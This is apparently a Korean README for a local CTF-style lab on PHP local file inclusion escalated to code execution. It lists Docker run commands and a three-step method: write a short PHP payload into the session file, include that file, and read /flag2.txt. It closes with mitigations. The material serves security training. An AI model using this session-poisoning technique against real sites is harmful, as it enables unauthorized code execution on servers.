# LFI #2 — 세션 RCE

| | |
|---|---|
| 버그클래스 | LFI to RCE |
| 난이도 | ★★★ |
| 포트 | 9205 |

## 학습 목표
사용자 입력이 세션 파일에 저장되고 LFI 로 임의 파일을 포함할 수 있다. 세션 파일에 PHP 코드를 심고 그 경로를 include 해 RCE.

## 실행
```bash
./gen_flags.sh
make up-injection   # 또는: docker compose up -d --build lfi-2 db
# http://localhost:9205
```

## 진행
1. `p` 에 `<?=\`cat /flag2.txt\`?>` 류 페이로드 → 세션 파일(`/tmp/sess_<SID>`)에 기록.
2. `?p=/tmp/sess_<본인SID>` 를 include → 코드 실행.
3. /flag2.txt 출력.

> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)

## 대응방안
include 화이트리스트, session.save_path 분리, 사용자 입력 경로 금지.
